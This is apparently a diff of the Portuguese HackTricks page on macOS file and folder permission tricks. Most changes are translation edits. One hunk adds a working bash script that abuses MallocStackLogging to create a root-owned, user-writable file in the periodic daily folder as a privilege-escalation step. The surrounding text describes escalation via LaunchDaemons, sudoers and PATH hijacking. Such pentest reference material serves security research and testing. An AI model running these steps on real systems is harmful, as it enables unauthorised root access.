@@ -9,7 +9,7 @@ Outras maneiras de apoiar o HackTricks:
 * Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
 * Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
@@ -19,7 +19,7 @@ Outras maneiras de apoiar o HackTricks:
 Permissões em um **diretório**:
 
 * **leitura** - você pode **enumerar** as entradas do diretório
-* **escrita** - você pode **excluir/escrever** **arquivos** no diretório e pode **excluir pastas vazias**.&#x20;
+* **escrita** - você pode **excluir/escrever** **arquivos** no diretório e você pode **excluir pastas vazias**.
 * Mas você **não pode excluir/modificar pastas não vazias** a menos que tenha permissões de escrita sobre elas.
 * Você **não pode modificar o nome de uma pasta** a menos que a possua.
 * **execução** - você está **autorizado a percorrer** o diretório - se você não tiver esse direito, não poderá acessar nenhum arquivo dentro dele, ou em quaisquer subdiretórios.
@@ -32,17 +32,17 @@ Permissões em um **diretório**:
 * Um **proprietário de diretório pai** no caminho é um **grupo de usuários** com **acesso de escrita**
 * Um **grupo de usuários** tem **acesso de escrita** ao **arquivo**
 
-Com qualquer uma das combinações anteriores, um atacante poderia **injetar** um **link simbólico/link físico** no caminho esperado para obter uma gravação arbitrária privilegiada.
+Com qualquer uma das combinações anteriores, um atacante poderia **injetar** um **link simbólico/rígido** no caminho esperado para obter uma gravação arbitrária privilegiada.
 
 ### Caso Especial de Raiz de Pasta R+X
 
-Se houver arquivos em um **diretório** onde **apenas o root tem acesso R+X**, esses arquivos **não são acessíveis a mais ninguém**. Portanto, uma vulnerabilidade que permita **mover um arquivo legível por um usuário**, que não pode ser lido por causa dessa **restrição**, desta pasta **para outra**, poderia ser abusada para ler esses arquivos.
+Se houver arquivos em um **diretório** onde **apenas o root tem acesso R+X**, esses arquivos **não são acessíveis a mais ninguém**. Portanto, uma vulnerabilidade que permita **mover um arquivo legível por um usuário**, que não pode ser lido por causa dessa **restrição**, desta pasta **para outra diferente**, poderia ser abusada para ler esses arquivos.
 
 Exemplo em: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Link Simbólico / Link Físico
+## Link Simbólico / Link Rígido
 
-Se um processo privilegiado estiver gravando dados em um **arquivo** que poderia ser **controlado** por um **usuário com menos privilégios**, ou que poderia ter sido **previamente criado** por um usuário com menos privilégios. O usuário poderia simplesmente **apontá-lo para outro arquivo** via um Link Simbólico ou Físico, e o processo privilegiado gravará nesse arquivo.
+Se um processo privilegiado estiver gravando dados em um **arquivo** que poderia ser **controlado** por um **usuário com menos privilégios**, ou que poderia ser **previamente criado** por um usuário com menos privilégios. O usuário poderia simplesmente **apontá-lo para outro arquivo** via um Link Simbólico ou Rígido, e o processo privilegiado gravará nesse arquivo.
 
 Verifique nas outras seções onde um atacante poderia **abusar de uma gravação arbitrária para escalar privilégios**.
 
@@ -76,7 +76,7 @@ xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### Sinalizador uchg / uchange / uimmutable
 
-Se um arquivo/pasta tiver esse atributo imutável, não será possível adicionar um xattr a ele.
+Se um arquivo/pasta tiver esse atributo imutável, não será possível colocar um xattr nele.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -158,7 +158,7 @@ Não é realmente necessário, mas eu deixo aqui caso:
 
 Os pacotes contêm o arquivo **`_CodeSignature/CodeResources`** que contém o **hash** de cada **arquivo** no **pacote**. Note que o hash do CodeResources também está **embutido no executável**, então não podemos mexer com isso também.
 
-No entanto, existem alguns arquivos cuja assinatura não será verificada, esses têm a chave omitida no plist, como:
+No entanto, existem alguns arquivos cuja assinatura não será verificada, esses têm a chave omit no plist, como:
 ```xml
 <dict>
 ...
@@ -235,7 +235,7 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 
 ## Gravações Arbitrárias
 
-### Scripts sh periódicos
+### Scripts periódicos sh
 
 Se o seu script puder ser interpretado como um **script shell**, você pode sobrescrever o script shell **`/etc/periodic/daily/999.local`** que será acionado todos os dias.
 
@@ -260,8 +260,6 @@ Escreva um **LaunchDaemon** arbitrário como **`/Library/LaunchDaemons/xyz.hackt
 </dict>
 </plist>
 ```
-### Script de Privilégio de Escalação
-
 Apenas gere o script `/Applications/Scripts/privesc.sh` com os **comandos** que você gostaria de executar como root.
 
 ### Arquivo Sudoers
@@ -270,10 +268,24 @@ Se você tiver **escrita arbitrária**, você poderia criar um arquivo dentro da
 
 ### Arquivos PATH
 
-O arquivo **`/etc/paths`** é um dos principais lugares que popula a variável de ambiente PATH. Você deve ser root para sobrescrevê-lo, mas se um script de um **processo privilegiado** estiver executando algum **comando sem o caminho completo**, você pode ser capaz de **sequestrá-lo** modificando este arquivo.
+O arquivo **`/etc/paths`** é um dos principais locais que popula a variável de ambiente PATH. Você deve ser root para sobrescrevê-lo, mas se um script de um **processo privilegiado** estiver executando algum **comando sem o caminho completo**, você pode ser capaz de **sequestrá-lo** modificando este arquivo.
 
-&#x20;Você também pode escrever arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.
+Você também pode escrever arquivos em **`/etc/paths.d`** para carregar novas pastas na variável de ambiente `PATH`.
 
+## Gerar arquivos graváveis como outros usuários
+
+Isso irá gerar um arquivo que pertence ao root e é gravável por mim ([**código daqui**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Isso também pode funcionar como privesc:
+```bash
+DIRNAME=/usr/local/etc/periodic/daily
+
+mkdir -p "$DIRNAME"
+chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"
+
+MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername
+
+FILENAME=$(ls "$DIRNAME")
+echo $FILENAME
+```
 ## Referências
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
@@ -284,10 +296,10 @@ O arquivo **`/etc/paths`** é um dos principais lugares que popula a variável d
 
 Outras maneiras de apoiar o HackTricks:
 
-* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
